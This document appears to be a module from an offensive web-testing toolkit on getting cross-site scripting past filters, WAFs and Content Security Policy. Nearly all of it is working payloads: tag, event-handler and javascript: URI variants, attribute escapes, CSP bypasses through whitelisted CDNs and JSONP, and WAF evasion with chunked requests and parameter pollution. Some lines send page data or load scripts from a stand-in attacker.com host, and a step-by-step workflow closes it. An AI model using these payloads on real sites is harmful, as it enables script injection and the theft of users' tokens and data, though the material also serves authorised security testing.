# BYPASS MODULE — XSS Filter Evasion
# Layer: shared/bypass
# Load when XSS payload is blocked by WAF, sanitizer, or application filter

## THEORY

XSS filters fail because HTML is ambiguous and parsers differ.
The browser's HTML parser is the ground truth — if the browser executes it,
it is XSS, regardless of what the filter thought it was parsing.

Strategy: find the gap between what the filter rejects and what the browser accepts.

---

## 1. TAG VARIATIONS

### Case manipulation (most filters are case-sensitive)
```html
<SCRIPT>alert(1)</SCRIPT>
<Script>alert(1)</Script>
<sCrIpT>alert(1)</sCrIpT>
```

### Whitespace and special chars inside tag name
```html
<script >alert(1)</script>     <!-- space before > -->
<script/xss>alert(1)</script>  <!-- fake attribute name -->
<script	>alert(1)</script>    <!-- tab instead of space -->
```

### Non-standard closing tags
```html
<script>alert(1)</script/>     <!-- slash in closing tag -->
<script>alert(1)<!-->          <!-- comment instead of close -->
<script>alert(1)               <!-- unclosed - browser still executes -->
```

### HTML5 new tags (bypass old tag allowlists)
```html
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<source onerror=alert(1)>
<track onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

### SVG and MathML contexts
```html
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text>click</text></a>
<math><maction actiontype=statusline#javascript:alert(1)>CLICK
<svg><set onbegin=alert(1)>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
```

---

## 2. EVENT HANDLER BYPASSES

### Universal event handlers (no user interaction)
```html
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
<img src=x onerror=alert`1`>          <!-- backtick — no parens -->
<body onload=alert(1)>
<iframe onload=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>     <!-- focuses automatically -->
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
```

### Interaction-required (lower priority but useful for CSP bypass)
```html
<a href=javascript:alert(1)>click</a>
<a href="javascript:void(0)" onclick=alert(1)>click</a>
<button onclick=alert(1)>click</button>
<div onmouseover=alert(1)>hover</div>
<div onclick=alert(1)>click</div>
```

### Less common event handlers (bypass event handler blocklists)
```html
onpointerenter  onpointerover  onpointermove
onanimationend  onanimationstart  ontransitionend
onformdata  onscroll  onresize
oncopy  oncut  onpaste
ondrag  ondragstart  ondrop  ondragenter
onwheel  onkeydown  onkeypress
```

### Event handler without = (some parsers accept)
```html
<img src=x onerror ="alert(1)">       <!-- space before = -->
<img src=x onerror= "alert(1)">       <!-- space after = -->
<img src=x onerror
=alert(1)>                            <!-- newline before = -->
```

---

## 3. JAVASCRIPT URI BYPASSES

```html
<!-- Standard -->
<a href="javascript:alert(1)">

<!-- Case -->
<a href="JAVASCRIPT:alert(1)">
<a href="Javascript:alert(1)">

<!-- Encoded -->
<a href="javascript&#58;alert(1)">    <!-- : as entity -->
<a href="&#106;avascript:alert(1)">   <!-- j as entity -->
<a href="java&#x09;script:alert(1)">  <!-- tab in keyword -->
<a href="java&#x0A;script:alert(1)">  <!-- newline in keyword -->
<a href="java&#x0D;script:alert(1)">  <!-- CR in keyword -->

<!-- URL encoded -->
<a href="java%0ascript:alert(1)">
<a href="java%09script:alert(1)">

<!-- Whitespace stripping -->
<a href="  javascript:alert(1)">      <!-- leading spaces -->
<a href="javascript:  alert(1)">      <!-- internal spaces -->
```

---

## 4. ATTRIBUTE CONTEXT ESCAPES

### Without quotes (raw attribute injection)
```html
<!-- Inject into: <input value=INJECT> -->
INJECT: x onmouseover=alert(1)
Result: <input value=x onmouseover=alert(1)>

<!-- Inject into: <a href=INJECT> -->
INJECT: javascript:alert(1)
```

### Single-quoted attribute escape
```html
<!-- Context: <input value='INJECT'> -->
INJECT: ' onmouseover='alert(1)
Result: <input value='' onmouseover='alert(1)'>
```

### Double-quoted with encoded quote
```html
<!-- If " is filtered but HTML entities work -->
INJECT: &quot; onmouseover=&quot;alert(1)
```

### Breaking out of JS string context in attribute
```html
<!-- Context: <input onclick="doThing('INJECT')"> -->
INJECT: ');alert(1);//
INJECT: ');alert(1)/*
INJECT: \');alert(1);//    <!-- if \ is stripped -->
```

---

## 5. CONTENT SECURITY POLICY (CSP) BYPASSES

### Identify CSP first
```bash
curl -s -I https://target.com/ | grep -i content-security-policy
```

### Bypass unsafe-eval
```javascript
// If unsafe-eval allowed:
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
eval("alert(1)")
```

### Bypass strict-dynamic with nonce
```html
<!-- If nonce-based CSP with strict-dynamic: -->
<!-- Find a script that uses document.write or innerHTML -->
<!-- Inject: <script nonce=STOLEN_NONCE>alert(1)</script> -->
<!-- Or find a JSONP endpoint on whitelisted domain -->
```

### Whitelisted CDN abuse
```html
<!-- If CSP allows *.googleapis.com, *.cloudflare.com, etc. -->
<!-- angular.js JSONP callback via whitelisted CDN: -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)//"></script>
<!-- angularjs CSP bypass: -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>
```

### JSONP endpoints on whitelisted domains
```bash
# Find JSONP on same domain or whitelisted CDN
curl "https://target.com/api/user?callback=alert(1)"
# If response: alert(1)({"user":"admin",...}) → XSS via JSONP
```

### base-uri bypass (for CSP without base-uri restriction)
```html
<base href="https://attacker.com/">
<!-- All relative script src now load from attacker.com -->
```

### Dangling markup injection (no script execution needed — steal tokens)
```html
<!-- When CSP blocks scripts but allows img: -->
<!-- Inject: -->
<img src='https://attacker.com/steal?data=
<!-- Everything until next quote character is sent as URL path -->
```

---

## 6. FILTER STRING BYPASSES

### Keyword splitting with comments
```html
<scr<!---->ipt>alert(1)</scr<!---->ipt>   <!-- HTML comment splits keyword -->
```

### Null byte injection (some parsers strip NUL)
```
<scr\x00ipt>alert(1)</scr\x00ipt>
<img \x00src=x onerror=alert(1)>
```

### Extra characters that HTML parsers ignore
```html
<img/src=x/onerror=alert(1)>   <!-- / between attributes -->
<img %09 src=x onerror=alert(1)>  <!-- tab -->
```

### Recursive filter bypass (filter applied once, not recursively)
```html
<!-- Filter strips <script> but not recursively: -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<sc<script>ript>alert(1)</sc</script>ript>
```

### Alternative quotes
```html
<img src=`x` onerror=`alert(1)`>     <!-- backtick as attr delimiter (IE) -->
```

---

## 7. WAF BYPASS TECHNIQUES

### HTTP-level evasion
```bash
# Chunked transfer (some WAFs don't reassemble chunks)
curl -s -X POST https://target.com/search \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'5\r\n<svg/\r\n9\r\nonload=al\r\n8\r\nert(1)>\r\n0\r\n\r\n'

# Parameter pollution (WAF checks first param, app uses last)
GET /search?q=hello&q=<script>alert(1)</script>

# Case variation in method
get /search?q=<script>alert(1)</script>  HTTP/1.1

# Non-standard content type
Content-Type: application/x-www-form-urlencoded; charset=ibm037
# Some WAFs skip body parsing for unknown charsets
```

### Payload fragmentation
```bash
# Split payload across multiple parameters if app concatenates them
GET /search?a=<scr&b=ipt>alert(1)</script>

# Split across cookies if app combines cookie + param
Cookie: prefix=<scr
GET /page?suffix=ipt>alert(1)</script>
```

### Timing-based WAF detection
```bash
# If WAF adds latency when blocking, time the requests
time curl -s "https://target.com/?x=<script>alert(1)</script>"
time curl -s "https://target.com/?x=hello"
# If blocked request takes >500ms more → confirm WAF is active
```

---

## SYSTEMATIC BYPASS WORKFLOW

When a payload is blocked:

1. Confirm block: is it the WAF, the app, or the sink sanitizer?
   - WAF block: different HTTP status (403/406) or WAF error page
   - App filter: 200 but payload stripped/encoded in response
   - Sink sanitizer: payload stored but escaped on output

2. Identify which characters/keywords trigger the block:
   - Binary search: test half the payload, then narrow down
   - Test each character individually: < > " ' ( ) ;

3. Apply encoding from encoding.md appropriate to the context:
   - URL context: URL encoding
   - HTML attribute: HTML entity encoding
   - JS string: JS unicode/hex escapes

4. If encoding fails: try structural bypass (tag variants, event handlers)

5. If structural bypass fails: try WAF evasion (chunking, parameter pollution)

6. Document the successful bypass chain — include in PoC
